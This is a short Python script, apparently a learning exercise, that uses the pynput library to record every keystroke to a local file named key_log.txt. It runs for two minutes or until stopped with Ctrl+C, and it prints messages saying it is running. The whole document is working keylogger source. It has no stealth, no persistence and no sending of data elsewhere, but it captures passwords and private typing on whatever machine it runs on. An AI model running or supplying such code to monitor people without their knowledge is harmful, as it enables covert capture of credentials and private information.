import threading
from pynput import keyboard

log_file = "key_log.txt"
runtime_seconds = 120  # Keylogger runs for 2 minutes
stop_keylogger_flag = False

# Logging function
def on_press(key):
    if stop_keylogger_flag:
        return False  # Stop listener
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f"[{key}]")

# Function to stop the keylogger
def stop_keylogger(listener):
    global stop_keylogger_flag
    stop_keylogger_flag = True
    print("\n[+] Auto-stopping keylogger after 2 minutes.")
    listener.stop()

# Start and manage the keylogger
def start_keylogger():
    global stop_keylogger_flag
    print("[+] Keylogger is running... Press Ctrl+C to stop early.")

    listener = keyboard.Listener(on_press=on_press)
    listener.start()

    # Set up auto-stop timer
    timer = threading.Timer(runtime_seconds, stop_keylogger, [listener])
    timer.start()

    try:
        listener.join()  # Wait until listener stops
    except KeyboardInterrupt:
        stop_keylogger_flag = True
        print("\n[+] Keylogger manually stopped by user.")
        listener.stop()
        timer.cancel()  # Cancel auto-stop timer

# Run it
start_keylogger()
